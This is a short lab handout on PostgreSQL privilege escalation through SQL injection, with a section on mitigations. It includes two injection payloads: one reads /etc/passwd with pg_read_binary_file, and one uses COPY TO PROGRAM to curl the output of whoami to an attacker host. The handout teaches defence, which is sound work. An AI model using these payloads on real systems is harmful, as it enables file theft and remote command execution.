# Lab 4: PostgreSQL Privilege Escalation Discussion

## Concept
In a typical web application setup, the application connects to the database as a specific user (e.g., `postgres`). If that user has too many privileges, an SQL injection vulnerability can lead to a full system takeover.

## The Risks

1. **`pg_read_binary_file()`**: If the DB user has superuser privileges, an attacker can read sensitive files from the host OS filesystem (like `/etc/shadow` or `.ssh/id_rsa`).
   ```sql
   ' UNION SELECT NULL, pg_read_binary_file('/etc/passwd')::text--
   ```

2. **`COPY FROM PROGRAM`**: This allows executing shell commands on the server.
   ```sql
   ' ; COPY (SELECT 'hack') TO PROGRAM 'curl http://attacker.com/`whoami`'--
   ```

3. **Database Links**: Using `dblink` to move from one database server to another within a network.

## Mitigation (Defense in Depth)

1. **Principle of Least Privilege**: The application should connect as a restricted user (e.g., `app_user`) that ONLY has access to the specific tables it needs.
2. **Disable Dangerous Extensions**: Ensure extensions like `adminpack` are not installed unless necessary.
3. **Network Isolation**: Ensure the database is not accessible from the public internet (already done in our Docker setup!).
